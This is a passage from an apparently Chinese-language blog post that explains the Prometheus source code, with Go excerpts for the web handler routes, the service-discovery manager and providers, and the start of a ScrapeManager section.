err != <span class="literal">nil</span> &#123;</span><br><span class="line">cwd = <span class="string">"&lt;error retrieving current working directory&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> logger == <span class="literal">nil</span> &#123;</span><br><span class="line">logger = log.NewNopLogger()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">h := &amp;Handler&#123;</span><br><span class="line">logger:      logger,</span><br><span class="line">router:      router,</span><br><span class="line">quitCh:      <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">reloadCh:    <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> error),</span><br><span class="line">options:     o,</span><br><span class="line">versionInfo: o.Version,</span><br><span class="line">birth:       time.Now(),</span><br><span class="line">cwd:         cwd,</span><br><span class="line">flagsMap:    o.Flags,</span><br><span class="line"></span><br><span class="line">context:       o.Context,</span><br><span class="line">scrapeManager: o.ScrapeManager,</span><br><span class="line">ruleManager:   o.RuleManager,</span><br><span class="line">queryEngine:   o.QueryEngine,</span><br><span class="line">tsdb:          o.TSDB,</span><br><span class="line">storage:       o.Storage,</span><br><span class="line">notifier:      o.Notifier,</span><br><span class="line"></span><br><span class="line">now: model.Now,</span><br><span class="line"></span><br><span class="line">ready: <span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">h.apiV1 = api_v1.NewAPI(h.queryEngine, h.storage, h.scrapeManager, h.notifier,</span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">config</span>.<span class="title">Config</span></span> &#123;</span><br><span class="line">h.mtx.RLock()</span><br><span class="line"><span class="keyword">defer</span> h.mtx.RUnlock()</span><br><span class="line"><span class="keyword">return</span> *h.config</span><br><span class="line">&#125;,</span><br><span class="line">h.testReady,</span><br><span class="line">h.options.TSDB,</span><br><span class="line">h.options.EnableAdminAPI,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.RoutePrefix != <span class="string">"/"</span> &#123;</span><br><span class="line"><span class="comment">// If the prefix is missing for the root path, prepend it.</span></span><br><span class="line">router.Get(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">http.Redirect(w, r, o.RoutePrefix, http.StatusFound)</span><br><span class="line">&#125;)</span><br><span class="line">router = router.WithPrefix(o.RoutePrefix)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">instrh := prometheus.InstrumentHandler</span><br><span class="line">instrf := prometheus.InstrumentHandlerFunc</span><br><span class="line">readyf := h.testReady</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">http.Redirect(w, r, path.Join(o.ExternalURL.Path, <span class="string">"/graph"</span>), http.StatusFound)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/alerts"</span>, readyf(instrf(<span class="string">"alerts"</span>, h.alerts)))   <span class="comment">//alerts信息</span></span><br><span class="line">router.Get(<span class="string">"/graph"</span>, readyf(instrf(<span class="string">"graph"</span>, h.graph)))      <span class="comment">//graph接口</span></span><br><span class="line">router.Get(<span class="string">"/status"</span>, readyf(instrf(<span class="string">"status"</span>, h.status)))    <span class="comment">//status状态</span></span><br><span class="line">router.Get(<span class="string">"/flags"</span>, readyf(instrf(<span class="string">"flags"</span>, h.flags)))</span><br><span class="line">router.Get(<span class="string">"/config"</span>, readyf(instrf(<span class="string">"config"</span>, h.serveConfig)))</span><br><span class="line">router.Get(<span class="string">"/rules"</span>, readyf(instrf(<span class="string">"rules"</span>, h.rules)))      <span class="comment">//rules</span></span><br><span class="line">router.Get(<span class="string">"/targets"</span>, readyf(instrf(<span class="string">"targets"</span>, h.targets))) <span class="comment">// Bucket targets by job label</span></span><br><span class="line">router.Get(<span class="string">"/version"</span>, readyf(instrf(<span class="string">"version"</span>, h.version)))</span><br><span class="line">router.Get(<span class="string">"/service-discovery"</span>, readyf(instrf(<span class="string">"servicediscovery"</span>, h.serviceDiscovery)))</span><br><span class="line"><span class="comment">//服务发现</span></span><br><span class="line">router.Get(<span class="string">"/heap"</span>, instrf(<span class="string">"heap"</span>, h.dumpHeap))</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/metrics"</span>, prometheus.Handler().ServeHTTP)</span><br><span class="line"><span class="comment">//当前所有指标数据</span></span><br><span class="line">router.Get(<span class="string">"/federate"</span>, readyf(instrh(<span class="string">"federate"</span>, httputil.CompressionHandler&#123;</span><br><span class="line">Handler: http.HandlerFunc(h.federation),</span><br><span class="line">&#125;)))</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/consoles/*filepath"</span>, readyf(instrf(<span class="string">"consoles"</span>, h.consoles)))</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/static/*filepath"</span>, instrf(<span class="string">"static"</span>, h.serveStaticAsset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.UserAssetsPath != <span class="string">""</span> &#123;</span><br><span class="line">router.Get(<span class="string">"/user/*filepath"</span>, instrf(<span class="string">"user"</span>, route.FileServe(o.UserAssetsPath)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.EnableLifecycle &#123;</span><br><span class="line">router.Post(<span class="string">"/-/quit"</span>, h.quit)</span><br><span class="line">router.Post(<span class="string">"/-/reload"</span>, h.reload)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">router.Post(<span class="string">"/-/quit"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusForbidden)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Lifecycle APIs are not enabled"</span>))</span><br><span class="line">&#125;)</span><br><span class="line">router.Post(<span class="string">"/-/reload"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusForbidden)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Lifecycle APIs are not enabled"</span>))</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">router.Get(<span class="string">"/-/quit"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusMethodNotAllowed)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Only POST requests allowed"</span>))</span><br><span class="line">&#125;)</span><br><span class="line">router.Get(<span class="string">"/-/reload"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusMethodNotAllowed)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Only POST requests allowed"</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/debug/*subpath"</span>, serveDebug)</span><br><span class="line">router.Post(<span class="string">"/debug/*subpath"</span>, serveDebug)</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/-/healthy"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusOK)</span><br><span class="line">fmt.Fprintf(w, <span class="string">"Prometheus is Healthy.\n"</span>)</span><br><span class="line">&#125;)</span><br><span class="line">router.Get(<span class="string">"/-/ready"</span>, readyf(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusOK)</span><br><span class="line">fmt.Fprintf(w, <span class="string">"Prometheus is Ready.\n"</span>)</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> h</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>reload接口调用发送信号给reloadCh，重新加载配置。web主要内容就这些。</p><h2 id="DiscoveryManager"><a href="#DiscoveryManager" class="headerlink" title="DiscoveryManager"></a>DiscoveryManager</h2><p>数据采集之前，prometheus需要先发现数据采集的目标服务，然后从目标服务中获取指标数据，最后将指标数据存储到prometheus存储管理器中。</p><p>服务发现结构配置：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ServiceDiscoveryConfig configures lists of different service discovery mechanisms.</span></span><br><span class="line"><span class="keyword">type</span> ServiceDiscoveryConfig <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// List of labeled target groups for this job.</span></span><br><span class="line">StaticConfigs []*targetgroup.Group <span class="string">`yaml:"static_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of DNS service discovery configurations.</span></span><br><span class="line">DNSSDConfigs []*dns.SDConfig <span class="string">`yaml:"dns_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of file service discovery configurations.</span></span><br><span class="line">FileSDConfigs []*file.SDConfig <span class="string">`yaml:"file_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Consul service discovery configurations.</span></span><br><span class="line">ConsulSDConfigs []*consul.SDConfig <span class="string">`yaml:"consul_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Serverset service discovery configurations.</span></span><br><span class="line">ServersetSDConfigs []*zookeeper.ServersetSDConfig <span class="string">`yaml:"serverset_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// NerveSDConfigs is a list of Nerve service discovery configurations.</span></span><br><span class="line">NerveSDConfigs []*zookeeper.NerveSDConfig <span class="string">`yaml:"nerve_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// MarathonSDConfigs is a list of Marathon service discovery configurations.</span></span><br><span class="line">MarathonSDConfigs []*marathon.SDConfig <span class="string">`yaml:"marathon_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Kubernetes service discovery configurations.</span></span><br><span class="line">KubernetesSDConfigs []*kubernetes.SDConfig <span class="string">`yaml:"kubernetes_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of GCE service discovery configurations.</span></span><br><span class="line">GCESDConfigs []*gce.SDConfig <span class="string">`yaml:"gce_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of EC2 service discovery configurations.</span></span><br><span class="line">EC2SDConfigs []*ec2.SDConfig <span class="string">`yaml:"ec2_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of OpenStack service discovery configurations.</span></span><br><span class="line">OpenstackSDConfigs []*openstack.SDConfig <span class="string">`yaml:"openstack_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Azure service discovery configurations.</span></span><br><span class="line">AzureSDConfigs []*azure.SDConfig <span class="string">`yaml:"azure_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Triton service discovery configurations.</span></span><br><span class="line">TritonSDConfigs []*triton.SDConfig <span class="string">`yaml:"triton_sd_configs,omitempty"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Catches all undefined fields and must be empty after parsing.</span></span><br><span class="line">XXX <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125; <span class="string">`yaml:",inline"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>prometheus支持以上服务，除了StaticConfigs静态服务配置，其他都是动态的服务配置。</p><p>对所有的服务发现，都提供一个抽象接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Discoverer <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Run hands a channel to the discovery provider(consul,dns etc) through which it can send</span></span><br><span class="line"><span class="comment">// updated target groups.</span></span><br><span class="line"><span class="comment">// Must returns if the context gets canceled. It should not close the update</span></span><br><span class="line"><span class="comment">// channel on returning.</span></span><br><span class="line">Run(ctx context.Context, up <span class="keyword">chan</span>&lt;- []*targetgroup.Group)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>prometheus将所发现的服务都转换成为了targetGroup.Group结构，通过 up发送给ScrapeManager，完成服务上线。</p><p>代码路径：/discovery/targetgroup/targetgroup.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Group is a set of targets with a common label set(production , test, staging etc.).</span></span><br><span class="line"><span class="keyword">type</span> Group <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// Targets is a list of targets identified by a label set. Each target is</span></span><br><span class="line"><span class="comment">// uniquely identifiable in the group by its address label.</span></span><br><span class="line">Targets []model.LabelSet</span><br><span class="line"><span class="comment">// Labels is a set of labels that is common across all targets in the group.</span></span><br><span class="line">Labels model.LabelSet</span><br><span class="line"></span><br><span class="line"><span class="comment">// Source is an identifier that describes a group of targets.</span></span><br><span class="line">Source <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务发现管理者Manager是所有发现服务的入口，服务的上线，下线和更新都需要进行服务同步。</p><p>Manager的结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ Manager maintains a set of discovery providers and sends each update to a <span class="keyword">map</span> channel.</span><br><span class="line"><span class="comment">// Targets are grouped by the target set name.</span></span><br><span class="line"><span class="keyword">type</span> Manager <span class="keyword">struct</span> &#123;</span><br><span class="line">logger         log.Logger  <span class="comment">//系统日志记录</span></span><br><span class="line">mtx            sync.RWMutex  <span class="comment">//同步读写锁</span></span><br><span class="line">ctx            context.Context  <span class="comment">//协同控制</span></span><br><span class="line">discoverCancel []context.CancelFunc <span class="comment">//服务下线调用</span></span><br><span class="line"><span class="comment">// Some Discoverers(eg. k8s) send only the updates for a given target group</span></span><br><span class="line"><span class="comment">// so we use map[tg.Source]*targetgroup.Group to know which group to update.</span></span><br><span class="line">    <span class="comment">//发现的目标服务</span></span><br><span class="line">targets <span class="keyword">map</span>[poolKey]<span class="keyword">map</span>[<span class="keyword">string</span>]*targetgroup.Group</span><br><span class="line"><span class="comment">// The sync channels sends the updates in map[targetSetName] where targetSetName is the job value from the scrape config.</span></span><br><span class="line">    <span class="comment">//将所发现的目标服务以chan的方式通知接受方</span></span><br><span class="line">syncCh <span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在初始化的过程中给，构建discoveryManagerScrape，并通过调用applyConfig方法完成对Discoverer的构建。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ApplyConfig removes all running discovery providers and starts new ones using the provided config.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">ApplyConfig</span><span class="params">(cfg <span class="keyword">map</span>[<span class="keyword">string</span>]sd_config.ServiceDiscoveryConfig)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">m.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> m.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">m.cancelDiscoverers()</span><br><span class="line"><span class="keyword">for</span> name, scfg := <span class="keyword">range</span> cfg &#123;</span><br><span class="line"><span class="keyword">for</span> provName, prov := <span class="keyword">range</span> m.providersFromConfig(scfg) &#123;</span><br><span class="line">m.startProvider(m.ctx, poolKey&#123;setName: name, provider: provName&#125;, prov)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startProvider方法根据job_name，服务名称和具体的Discoverer实例启动所发现的scrape服务。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">providersFromConfig</span><span class="params">(cfg sd_config.ServiceDiscoveryConfig)</span> <span class="title">map</span>[<span class="title">string</span>]<span class="title">Discoverer</span></span> &#123;</span><br><span class="line">providers := <span class="keyword">map</span>[<span class="keyword">string</span>]Discoverer&#123;&#125;</span><br><span class="line"></span><br><span class="line">app := <span class="function"><span class="keyword">func</span><span class="params">(mech <span class="keyword">string</span>, i <span class="keyword">int</span>, tp Discoverer)</span></span> &#123;</span><br><span class="line">providers[fmt.Sprintf(<span class="string">"%s/%d"</span>, mech, i)] = tp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.DNSSDConfigs &#123;</span><br><span class="line">app(<span class="string">"dns"</span>, i, dns.NewDiscovery(*c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"dns"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.FileSDConfigs &#123;</span><br><span class="line">app(<span class="string">"file"</span>, i, file.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"file"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.ConsulSDConfigs &#123;</span><br><span class="line">k, err := consul.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"consul"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Consul discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"consul"</span>, i, k)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.MarathonSDConfigs &#123;</span><br><span class="line">t, err := marathon.NewDiscovery(*c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"marathon"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Marathon discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"marathon"</span>, i, t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.KubernetesSDConfigs &#123;</span><br><span class="line">k, err := kubernetes.New(log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"k8s"</span>), c)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Kubernetes discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"kubernetes"</span>, i, k)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.ServersetSDConfigs &#123;</span><br><span class="line">app(<span class="string">"serverset"</span>, i, zookeeper.NewServersetDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"zookeeper"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.NerveSDConfigs &#123;</span><br><span class="line">app(<span class="string">"nerve"</span>, i, zookeeper.NewNerveDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"nerve"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.EC2SDConfigs &#123;</span><br><span class="line">app(<span class="string">"ec2"</span>, i, ec2.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"ec2"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.OpenstackSDConfigs &#123;</span><br><span class="line">openstackd, err := openstack.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"openstack"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot initialize OpenStack discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"openstack"</span>, i, openstackd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.GCESDConfigs &#123;</span><br><span class="line">gced, err := gce.NewDiscovery(*c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"gce"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot initialize GCE discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"gce"</span>, i, gced)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.AzureSDConfigs &#123;</span><br><span class="line">app(<span class="string">"azure"</span>, i, azure.NewDiscovery(c, log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"azure"</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> cfg.TritonSDConfigs &#123;</span><br><span class="line">t, err := triton.New(log.With(m.logger, <span class="string">"discovery"</span>, <span class="string">"trition"</span>), c)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Cannot create Triton discovery"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">app(<span class="string">"triton"</span>, i, t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cfg.StaticConfigs) &gt; <span class="number">0</span> &#123;</span><br><span class="line">app(<span class="string">"static"</span>, <span class="number">0</span>, NewStaticProvider(cfg.StaticConfigs))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> providers</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用startProvider启动服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">startProvider</span><span class="params">(ctx context.Context, poolKey poolKey, worker Discoverer)</span></span> &#123;</span><br><span class="line">ctx, cancel := context.WithCancel(ctx)</span><br><span class="line">updates := <span class="built_in">make</span>(<span class="keyword">chan</span> []*targetgroup.Group)</span><br><span class="line"></span><br><span class="line">m.discoverCancel = <span class="built_in">append</span>(m.discoverCancel, cancel)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> worker.Run(ctx, updates)</span><br><span class="line"><span class="keyword">go</span> m.runProvider(ctx, poolKey, updates)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">runProvider</span><span class="params">(ctx context.Context, poolKey poolKey, updates <span class="keyword">chan</span> []*targetgroup.Group)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> tgs, ok := &lt;-updates:</span><br><span class="line"><span class="comment">// Handle the case that a target provider exits and closes the channel</span></span><br><span class="line"><span class="comment">// before the context is done.</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">m.updateGroup(poolKey, tgs)</span><br><span class="line">m.syncCh &lt;- m.allGroups()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个服务在discovery目录中对应的服务启动。如DNS Discovery服务在完成启动之后，runProvider将接收更新之后的服务信息updates，并将新的服务信息通过updateGroup方法同步到targets列表，在调用allgroups方法完成对服务快照信息的构建，发送到指标的管理器中ScraperManager。</p><p>流程：</p><p><img src="/images/1572414553678.png" alt="1572414553678"></p><h2 id="ScrapeManager"><a href="#ScrapeManager" class="headerlink" title="ScrapeManager"></a>ScrapeManager</h2><p>scrapeManager组件的采集周期在prometheus.yml配置文件中由global节点下的scrape_interval指定，各个job_name可以在scrape_configs下进行个性化的设置，设置符合自身场景的scrape_interval</p><p>指标采集是指从发现的服务中定时获取指标数据。prometheus在启动的过程中会完成对scrapeManager的初始化，初始化过程包括构建scrapeManager实列，加载配置启动scrapeManager实例三个。scrapeManager复制维护scrapePool，并管理scrape组件的生命周期</p><p>ScrapeManager通过调用NewScrapeManager方法完成对scapeManager实例的创建。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 